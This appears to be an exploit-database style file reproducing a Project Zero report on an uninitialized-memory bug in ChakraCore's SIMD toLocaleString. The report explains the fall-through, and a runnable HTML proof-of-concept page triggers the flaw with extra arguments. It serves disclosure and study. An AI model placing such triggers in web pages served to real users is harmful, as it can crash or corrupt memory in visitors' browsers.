@@ -1,0 +1,36 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=961
+
+The following code occurs in JavascriptSIMDObject::ToLocaleString in JavascriptSimdObject.cpp:
+
+        Var* newArgs = HeapNewArray(Var, numArgs);
+        switch (numArgs)
+        {
+        case 1:
+            break;
+        case 2:
+            newArgs[1] = args[1];
+            break;
+        case 3:
+            newArgs[1] = args[1];
+            newArgs[2] = args[2];
+            break;
+        default:
+            Assert(UNREACHED);
+        }
+
+If the call has more than three arguments, it will fall through, leaving newArgs uninitialized. This will cause toLocaleString to be called on uninitialized memory, having a similar effect to type confusion (as integers in the memory can be confused for pointers and vice-versa). A minimal PoC is as follows, and a full PoC is attached:
+
+    var v = SIMD.Int32x4(1, 2, 3, 4);
+    v.toLocaleString(1, 2, 3, 4)
+-->
+
+<html><body><script>
+    try{
+    var v = SIMD.Int32x4(1, 2, 3, 4);
+    alert(v.toLocaleString(1, 2, 3, 4, 5, 6, 7));
+	}catch(e){
+	alert(e.message);
+
+}
+</script></body></html>
